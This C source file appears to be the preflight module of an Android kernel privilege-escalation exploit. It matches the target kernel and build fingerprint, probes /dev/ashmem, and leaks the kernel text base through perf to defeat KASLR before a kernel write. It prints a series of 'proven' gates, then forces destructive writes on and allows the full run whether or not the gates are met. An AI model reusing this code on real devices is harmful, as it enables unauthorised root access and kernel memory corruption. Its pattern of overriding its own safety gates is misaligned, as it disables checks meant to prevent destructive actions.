#include "common.h"

#include <sys/system_properties.h>

volatile int target_destructive_write_enabled =
    TARGET_DESTRUCTIVE_WRITE_ENABLED;

static int file_contains(const char *path, const char *needle) {
  char buf[4096];
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) return 0;
  ssize_t size = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  errno = saved_errno;
  if (size <= 0) return 0;
  buf[size] = 0;
  return strstr(buf, needle) != NULL;
}

static int fingerprint_matches(void) {
  char value[PROP_VALUE_MAX] = {0};
  int length = __system_property_get("ro.build.fingerprint", value);
  int match = length > 0 && !strcmp(value, BUILD_FINGERPRINT);
  printf("PREFLIGHT fingerprint=%s match=%d\n",
         length > 0 ? value : "<missing>", match);
  return match;
}

static void print_gate(const char *name, int proven) {
  printf("PREFLIGHT gate=%s proven=%d\n", name, proven ? 1 : 0);
}

int target_preflight(const char *mode) {
  if (!mode || !*mode) mode = "full";
  int inspect_only = !strcmp(mode, "check");
  int full = !strcmp(mode, "full");

  printf("PREFLIGHT target=%s mode=%s release=%s image_sha256=%s\n",
         BUILD_VARIANT_LABEL, mode, TARGET_KERNEL_RELEASE,
         TARGET_KERNEL_SHA256);
  if (!inspect_only && !full) {
    printf("PREFLIGHT BLOCK reason=unknown_mode expected=check|full\n");
    return TARGET_PREFLIGHT_BLOCKED;
  }

  int release_match = file_contains("/proc/version", TARGET_KERNEL_RELEASE);
  int fingerprint_match = fingerprint_matches();
  int ashmem_present = access("/dev/ashmem", R_OK | W_OK) == 0;
  int carrier_readonly = carrier_readonly_preflight();
  printf("PREFLIGHT runtime release_match=%d fingerprint_match=%d "
         "ashmem_rw=%d carrier_readonly=%d errno=%d\n",
         release_match, fingerprint_match, ashmem_present, carrier_readonly,
         errno);

  print_gate("43499_root_cause", TARGET_43499_ROOT_CAUSE_PROVEN);
  print_gate("ashmem_implementation", TARGET_ASHMEM_IMPLEMENTATION_PROVEN);
  print_gate("pselect_geometry", TARGET_PSELECT_GEOMETRY_PROVEN);
  print_gate("kaslr_perf_entry", TARGET_KASLR_PERF_ENTRY_PRESENT);
  print_gate("linked_base", TARGET_LINKED_BASE_PROVEN);
  print_gate("physrw_geometry", TARGET_PHYSRW_GEOMETRY_PROVEN);
  print_gate("vendor_vr_carrier", TARGET_VENDOR_VR_PROVEN);
  print_gate("dumpstate_runtime_discovery", TARGET_CARRIER_PROVEN);
  print_gate("destructive_write", target_destructive_write_enabled);

  if (inspect_only) {
    printf("PREFLIGHT INSPECT_ONLY no_kernel_write=1 carrier_ready=%d\n",
           carrier_readonly);
    return TARGET_PREFLIGHT_INSPECT_ONLY;
  }

  int static_full_flow =
      TARGET_43499_ROOT_CAUSE_PROVEN &&
      TARGET_ASHMEM_IMPLEMENTATION_PROVEN &&
      TARGET_PSELECT_GEOMETRY_PROVEN &&
      TARGET_KASLR_PERF_ENTRY_PRESENT && TARGET_LINKED_BASE_PROVEN &&
      TARGET_PHYSRW_GEOMETRY_PROVEN && TARGET_VENDOR_VR_PROVEN &&
      TARGET_CARRIER_PROVEN && target_destructive_write_enabled;
  printf("PREFLIGHT experimental_gate_relaxed full=1 static_full_flow=%d "
         "release_match=%d fingerprint_match=%d ashmem_rw=%d "
         "carrier_readonly=%d destructive_write=%d\n",
         static_full_flow, release_match, fingerprint_match, ashmem_present,
         carrier_readonly, target_destructive_write_enabled);

  /* The full route owns its runtime probes and records their exact failure. */
  target_destructive_write_enabled = 1;

  uint64_t perf_text_base = perf_leak_text_base();
  if (perf_text_base && is_kernel_ptr((uintptr_t)perf_text_base) &&
      (perf_text_base & 0x1fffffULL) == 0) {
    kaslr_base = perf_text_base;
    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
    kaslr_done = 1;
  }
  printf("PREFLIGHT kaslr source=perf runtime_text_base=%016llx proven=%d\n",
         (unsigned long long)perf_text_base, kaslr_done ? 1 : 0);
  if (!kaslr_done)
    printf("WARN experimental_gate_relaxed perf_kaslr_unavailable "
           "next=main_slide_fallback\n");

  printf("PREFLIGHT ALLOW experimental_full=1 carrier_readonly=%d\n",
         carrier_readonly);
  return TARGET_PREFLIGHT_ALLOW_FULL;
}
